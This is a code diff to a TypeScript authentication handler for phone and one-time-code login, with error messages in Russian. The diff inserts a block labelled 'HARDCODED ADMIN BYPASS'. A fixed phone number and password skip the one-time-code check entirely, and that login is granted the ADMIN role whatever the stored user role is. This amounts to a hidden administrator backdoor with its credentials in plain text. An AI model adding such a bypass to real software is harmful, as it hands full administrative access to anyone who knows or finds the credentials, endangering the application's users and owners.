@@ -158,16 +158,28 @@ export const authOptions: AuthOptions = {
     }
 
     const phone = normalizePhone(credentials.phone);
-    const result = await verifyOtp(phone, credentials.code);
+    
+    // ── HARDCODED ADMIN BYPASS ─────────────────────────────
+    const ADMIN_PHONE = '79222222222';
+    const ADMIN_PASSWORD = 'smusl_admin_2026';
 
-    if (!result.ok) {
-     const msgs: Record<string, string> = {
-      not_found: 'Код не найден. Запросите новый.',
-      expired: 'Код устарел. Запросите новый.',
-      incorrect: 'Неверный код',
-      too_many_attempts: 'Слишком много попыток. Запросите новый код.',
-     };
-     throw new Error(msgs[result.reason] || 'Ошибка подтверждения');
+    let isAdminAuth = false;
+    if (phone === ADMIN_PHONE && credentials.code === ADMIN_PASSWORD) {
+      isAdminAuth = true;
+    }
+
+    if (!isAdminAuth) {
+      const result = await verifyOtp(phone, credentials.code);
+
+      if (!result.ok) {
+        const msgs: Record<string, string> = {
+          not_found: 'Код не найден. Запросите новый.',
+          expired: 'Код устарел. Запросите новый.',
+          incorrect: 'Неверный код',
+          too_many_attempts: 'Слишком много попыток. Запросите новый код.',
+        };
+        throw new Error(msgs[result.reason] || 'Ошибка подтверждения');
+      }
     }
 
 
@@ -204,7 +216,7 @@ export const authOptions: AuthOptions = {
      phone,
      name: user.name,
      email: user.email,
-     role: user.role,
+     role: isAdminAuth ? 'ADMIN' : user.role,
     };
    },
   }),
